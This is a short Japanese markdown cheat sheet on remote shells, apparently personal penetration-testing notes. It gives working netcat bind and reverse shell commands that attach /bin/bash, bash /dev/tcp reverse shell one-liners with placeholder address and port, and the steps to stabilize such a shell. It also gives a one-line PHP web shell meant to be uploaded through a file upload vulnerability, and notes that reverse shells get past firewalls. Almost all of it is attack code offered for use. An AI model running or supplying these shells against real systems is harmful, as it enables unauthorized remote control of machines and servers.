# 遠隔からのシェル

* ファイアウォールでインバウンド通信で接続とポートが許可されている場合はバインドシェルが可能
* アウトバウンド通信は許可されている場合が多いためリバースシェルはファイアウォールを回避しやすい。

## バインドシェル・リバースシェル `netcat`を使用

* netcat

``` shell
    # 待ち受け
    nc -vlp 1027
    # 接続
    nc -v 192.168.XXX.XXX 1027 -e /bin/bash
    # /bin/bashのところはwindowsならcmd.exe
```

* bash
  
``` shell
    bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1
    #または
    bash -c 'bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1'
```

* シェルの安定化

``` shell
    # python
    python3 -c 'import pty; pty.spawn("/bin/bash")'
```

``` shell
    # script
    script /dev/null -qc /bin/bash
```

``` shell
    # 共通
    ctrl + z
    stty raw -echo; fg
    SHELL=/bin/bash
    export TERM=screen
    stty rows 38 columns 116; reset;
```

## Webシェル

* 入力を待ち受けできるphpファイルを作成しFile Uploadの脆弱性を利用しアップロード
* アップしたphpファイルを利用してweb経由でコマンド実行

``` php
    # webshell.php
    <?php system($_GET["cmd"]); ?>
```

[リッチなwebshell](https://github.com/eb3095/php-shell/blob/master/php-shell.php)
